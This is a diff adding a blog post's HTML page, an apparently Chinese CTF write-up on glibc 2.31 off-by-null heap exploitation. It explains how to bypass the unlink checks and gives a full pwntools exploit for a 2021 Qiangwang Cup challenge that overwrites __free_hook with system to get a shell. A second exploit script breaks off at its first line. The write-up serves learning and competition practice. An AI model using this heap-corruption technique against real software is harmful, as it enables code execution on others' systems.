@@ -1,0 +1,822 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="2.232.23-2.27的版本只需要绕过unlink中的检查，一般都是chunk1, chunk2, chunk3的堆布局，先把chunk1释放进入unsorted bin，这样释放chunk3向低地址合并的时候，unlink chunk1的时候就会通过检查，因为chunk1本身就在unsortedbin中。 12if (__builtin_expect (fd-&gt;bk !&#x3D; p || b">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2.31-offbynull">
+<meta property="og:url" content="http://example.com/2021/10/19/2.31-offbynull/index.html">
+<meta property="og:site_name" content="Tm0tfl">
+<meta property="og:description" content="2.232.23-2.27的版本只需要绕过unlink中的检查，一般都是chunk1, chunk2, chunk3的堆布局，先把chunk1释放进入unsorted bin，这样释放chunk3向低地址合并的时候，unlink chunk1的时候就会通过检查，因为chunk1本身就在unsortedbin中。 12if (__builtin_expect (fd-&gt;bk !&#x3D; p || b">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://tmotfl-image.oss-cn-beijing.aliyuncs.com/img/image-20211019133848077.png">
+<meta property="og:image" content="http://tmotfl-image.oss-cn-beijing.aliyuncs.com/img/image-20211019134216502.png">
+<meta property="og:image" content="http://tmotfl-image.oss-cn-beijing.aliyuncs.com/img/image-20211019134930541.png">
+<meta property="og:image" content="http://tmotfl-image.oss-cn-beijing.aliyuncs.com/img/image-20211019135851206.png">
+<meta property="article:published_time" content="2021-10-19T06:23:03.000Z">
+<meta property="article:modified_time" content="2021-10-19T06:24:37.305Z">
+<meta property="article:author" content="Tm0tfl">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://tmotfl-image.oss-cn-beijing.aliyuncs.com/img/image-20211019133848077.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://example.com/2021/10/19/2.31-offbynull/"/>
+
+
+
+
+
+  <title>2.31-offbynull | Tm0tfl</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Tm0tfl</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/10/19/2.31-offbynull/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="http://qvb75z5z6.hn-bkt.clouddn.com/1605841888100229.jpeg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tm0tfl">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">2.31-offbynull</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-10-19T14:23:03+08:00">
+                2021-10-19
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index">
+                    <span itemprop="name">笔记</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="2-23"><a href="#2-23" class="headerlink" title="2.23"></a>2.23</h1><p><code>2.23-2.27</code>的版本只需要绕过<code>unlink</code>中的检查，一般都是<code>chunk1, chunk2, chunk3</code>的堆布局，先把<code>chunk1</code>释放进入<code>unsorted bin</code>，这样释放<code>chunk3</code>向低地址合并的时候，<code>unlink chunk1</code>的时候就会通过检查，因为<code>chunk1</code>本身就在<code>unsortedbin</code>中。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br></pre></td></tr></table></figure>
+<h1 id="2-29-2-31"><a href="#2-29-2-31" class="headerlink" title="2.29-2.31"></a>2.29-2.31</h1><p>新版本添加了一个检查，向低地址合并的时候检查了<code>chunk1</code>的<code>size</code>和<code>chunk3</code>的<code>presize</code>是否相等，上面那种布局没法通过这种检查。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">  prevsize = prev_size (p);</span><br><span class="line">  size += prevsize;</span><br><span class="line">  p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">  unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>看了安全客一篇文章，只要构造一个<code>fake chunk</code>，满足<code>FD-&gt;bk = P, BK-&gt;fd = P</code>，这个<code>fake chunk</code>之后是被<code>offbynull</code>攻击的<code>chunk</code>，伪造<code>presize</code>就可以造成堆块重叠。</p>
+<p>要利用<code>largebin</code>残留的<code>fd_nextsize, bk_nextsize</code>指针，<code>smallbin</code>残留的<code>bk</code>指针，<code>fastbin</code>残留的<code>fd</code>指针，(如果是无脑<code>offbynull</code>的话需要先布置堆块，让倒数第二个字节为<code>\x00</code>，就可以避免<code>offbynull</code>对指针的影响，需要爆破<code>1/16</code>)</p>
+<ol>
+<li><p>把<code>chunkA</code>放进<code>largebin</code>中，这样<code>largebin</code>中只有一个堆块的话<code>fd_nextsize, bk_nextsize</code>都是指向自己，从<code>chunkA</code>上切割<code>0x30</code>大小的堆块<code>chunk B</code>，在<code>chunkA+0x10</code>处伪造一个<code>fake chunk</code>。</p>
+</li>
+<li><p>填满<code>tcache</code>，放入两个<code>0x30</code>堆块进入<code>small bin</code>，<code>chunk1 &lt;=&gt; chunk2</code>，其中<code>chunk2</code>的<code>bk</code>指针指向了<code>chunk1</code>，而<code>chunk2</code>的<code>fd</code>指针是不关心的，可以修改<code>bk</code>指针的最后一个字节为<code>fake chunk</code>的地址，然后修改<code>fake chunk</code>的<code>fd</code>最后一个字节指向<code>chunk2</code>，这样就通过了<code>FD-&gt;bk = P</code>（我们可以构造一个堆布局，也就是让<code>chunk1, chunk2</code>从<code>chunkA</code>中切割，就不需要爆破）</p>
+</li>
+<li>填满<code>tcache</code>，因为<code>fake chunk</code>的<code>bk</code>指针是指向<code>chunkB</code>的，而是无法修改<code>bk</code>指针，所以只能修改<code>chunkB</code>的<code>fd</code>指针，放进<code>fastbin</code>之后，修改低字节就可以。</li>
+</ol>
+<p>这样就可以绕过<code>unlink</code>的检测，有关<code>size</code>的检测，这样构造的话，就不需要管，因为没有以前堆布局中间的<code>chunk2</code>，直接伪造<code>fake chunk</code>的<code>size</code>和<code>presize</code>就可以，具体可以看下面的例题。</p>
+<h1 id="例题2021广东强网杯T-S"><a href="#例题2021广东强网杯T-S" class="headerlink" title="例题2021广东强网杯T_S"></a>例题2021广东强网杯T_S</h1><p>群友发的题，2021广东强网杯团体赛</p>
+<p>是一个有条件的<code>offbynull</code>，其实更简单了，不用先调整堆的偏移了，构造倒数第二个字节为‘\x00’了。</p>
+<p>只能<code>show</code>一次，可以选择泄露<code>libc</code>，也可以选择泄露<code>heap</code>。<br>没有规定堆块大小，在<code>edit</code>的时候会调用一个函数.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">sub_137A</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1; <span class="comment">// [rsp+1Bh] [rbp-15h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> m; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> k; <span class="comment">// [rsp+24h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">  <span class="keyword">for</span> ( i = v2 / <span class="number">2</span>; i &gt; <span class="number">0</span>; i /= <span class="number">2</span> ) <span class="comment">//这个循环没啥用，来回交换</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = i; j &lt; v2; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> ( k = j - i; k &gt;= <span class="number">0</span> &amp;&amp; a1[k] &gt; a1[k + i]; k -= i )</span><br><span class="line">      &#123;</span><br><span class="line">        a1[k] += a1[k + i];</span><br><span class="line">        a1[k + i] = a1[k] - a1[k + i];</span><br><span class="line">        a1[k] -= a1[k + i];</span><br><span class="line">        v1 = a1[k];</span><br><span class="line">        a1[k] = a1[k + i];</span><br><span class="line">        a1[k + i] = v1;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//这里是漏洞点，如果把堆块都填满&#x27;\x01&#x27;，且下一个堆块的size以&#x27;\x01&#x27;结尾，就可以造成offbynull</span></span><br><span class="line">  <span class="keyword">for</span> ( m = <span class="number">0</span>; a1[m] == <span class="number">1</span>; ++m ) </span><br><span class="line">    a1[m] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h2><p>方法一就是泄露<code>heap</code>地址，这样就可以在<code>fake chunk</code>的<code>fd</code>和<code>bk</code>写入<code>fake chunk</code>的地址，绕过<code>unlink</code>检测。实现堆块重叠。</p>
+<p>然后通过爆破修改<code>stdout</code>来进行泄露<code>libc</code>，进而修改<code>freehook</code>。</p>
+<p>修改<code>stdout</code>泄露<code>libc</code>要构造使得<code>unsorted bin</code>切割后剩余堆块的<code>fd</code>和<code>bk</code>刚好放到一个已经被放入<code>tcache</code>的堆块中，这样继续从<code>unsorted bin</code>中切割，就可以控制<code>stdout</code>。就是来回申请堆块，然后该一个堆块的<code>size</code>，再次释放就可以了。</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    gdb.attach(p, <span class="string">&#x27;b *$rebase(0x1538)&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size</span>):</span> </span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;length&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span> </span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;:&#x27;</span>, content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span> </span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)    </span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">create(<span class="number">0x500</span>) <span class="comment">#0</span></span><br><span class="line">create(<span class="number">0x10</span>) <span class="comment">#1</span></span><br><span class="line">create(<span class="number">0x4f8</span>) <span class="comment">#2</span></span><br><span class="line">create(<span class="number">0x4f8</span>) <span class="comment">#3</span></span><br><span class="line">create(<span class="number">0x80</span>) <span class="comment">#4</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">create(<span class="number">0x510</span>) <span class="comment">#0</span></span><br><span class="line">create(<span class="number">0x20</span>) <span class="comment">#5</span></span><br><span class="line">create(<span class="number">0x4d0</span>) <span class="comment">#6</span></span><br><span class="line">edit(<span class="number">5</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">show(<span class="number">5</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">heapbase = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) &amp; (~<span class="number">0xFFF</span>)</span><br><span class="line">log.success(<span class="string">&#x27;heapbase: &#x27;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(heapbase)))</span><br><span class="line"></span><br><span class="line">fakeheap = heapbase+<span class="number">0x7d0</span></span><br><span class="line">edit(<span class="number">2</span>, <span class="string">&#x27;\x01&#x27;</span>*<span class="number">0x4f8</span>)</span><br><span class="line">edit(<span class="number">2</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x4f1</span>) + p64(fakeheap)*<span class="number">2</span> + <span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x4d0</span> + p64(<span class="number">0x4f0</span>))</span><br><span class="line">delete(<span class="number">3</span>) <span class="comment"># 0x9f1 is in unsorted bin, we can modify chunk2 to </span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x450</span>) <span class="comment">#3</span></span><br><span class="line">create(<span class="number">0x88</span>) <span class="comment">#7</span></span><br><span class="line">create(<span class="number">0x4e0</span>) <span class="comment">#8</span></span><br><span class="line">edit(<span class="number">7</span>, <span class="string">&#x27;\x01&#x27;</span>*<span class="number">0x80</span> + p64(<span class="number">0x4f0</span>))</span><br><span class="line">edit(<span class="number">2</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x4f1</span>))</span><br><span class="line"><span class="comment"># delete(8)</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">create(<span class="number">0x420</span>) <span class="comment">#3</span></span><br><span class="line">create(<span class="number">0x20</span>) <span class="comment">#4</span></span><br><span class="line">edit(<span class="number">2</span>, <span class="string">&#x27;\x00&#x27;</span>*(<span class="number">0x470</span>-<span class="number">0x40</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + <span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x30</span> + <span class="string">&#x27;\xa0\x26&#x27;</span>)</span><br><span class="line">create(<span class="number">0x80</span>) <span class="comment">#7</span></span><br><span class="line">create(<span class="number">0x80</span>) <span class="comment">#9</span></span><br><span class="line">edit(<span class="number">9</span>, p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">libcbase = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x1eb980</span></span><br><span class="line">log.success(<span class="string">&#x27;libcbase: &#x27;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(libcbase)))</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">freehook = libcbase + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libcbase + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">2</span>, <span class="string">&#x27;\x00&#x27;</span>*(<span class="number">0x440</span>) + p64(freehook))</span><br><span class="line">create(<span class="number">0x20</span>) <span class="comment">#4</span></span><br><span class="line">edit(<span class="number">4</span>, <span class="string">&#x27;/bin/sh&#x27;</span> + <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">create(<span class="number">0x20</span>) <span class="comment">#5</span></span><br><span class="line">edit(<span class="number">5</span>, p64(system))</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h2><p>方法二是泄露<code>libc</code>地址，利用残留<code>largebin, smallbin, fastbin</code>的堆块指针构造一个<code>fake chunk</code>，释放相邻的堆块，向低地址合并后就可以造成堆块重叠，看一下过程</p>
+<ol>
+<li>先从<code>large bin</code>分配一个<code>0x30</code>的堆块，<code>0x55555555b420</code>是<code>fake chunk</code>，可以看到<code>0x55555555b420+0x10(+0x18)</code>都已经填入了相应的堆地址，初始是指向<code>0x55555555b410</code>。</li>
+</ol>
+<p><img src="http://tmotfl-image.oss-cn-beijing.aliyuncs.com/img/image-20211019133848077.png" alt="image-20211019133848077"></p>
+<ol>
+<li><p>利用<code>small bin</code>的<code>bk</code>指针指向堆块的性质，向<code>small bin</code>中放入两个堆块。</p>
+<p><img src="http://tmotfl-image.oss-cn-beijing.aliyuncs.com/img/image-20211019134216502.png" alt="image-20211019134216502"></p>
+<p>其中<code>0x55555555b4a0</code>的<code>bk</code>是<code>0x55555555b440</code>，可以修改最后一个字节变成<code>0x55555555b420</code>，然后修改<code>fake chunk</code>的<code>fd</code>指向       <code>0x55555555b4a0</code>，就可以绕过<code>FD-&gt;bk = P</code></p>
+</li>
+</ol>
+<p><img src="http://tmotfl-image.oss-cn-beijing.aliyuncs.com/img/image-20211019134930541.png" alt="image-20211019134930541"></p>
+<ol>
+<li><p>利用<code>fastbin</code>的<code>fd</code>指针，可以看到<code>fake chunk</code>的<code>bk</code>指针是指向<code>0x55555555b410</code>，这个是没办法修改的，所以我们释放处于<code>0x55555555b410</code>的<code>chunk</code>进入<code>fastbin</code>中，这样<code>0x55555555b420</code>处就会有一个堆地址，同样修改最低字节就可以。   <img src="http://tmotfl-image.oss-cn-beijing.aliyuncs.com/img/image-20211019135851206.png" alt="image-20211019135851206"></p>
+</li>
+<li><p>之后填满<code>\x01</code>，伪造<code>presize</code>，就造成堆块重叠，之后就很简单了。</p>
+</li>
+<li><p>有一个地方需要注意，在伪造<code>chunk</code>的时候，要保持<code>0x55555555b440</code>的地方为<code>null</code>，这个地方相当于<code>fakechunk-&gt;fd_nextsize</code>，在进行<code>unlink</code>的时候有一个分支，要<code>fd_nextsize == NULL</code>才可以绕过。刚开始没注意，导入源码一步步调试才发现，ctmd。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (p)) &amp;&amp; p-&gt;fd_nextsize != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> 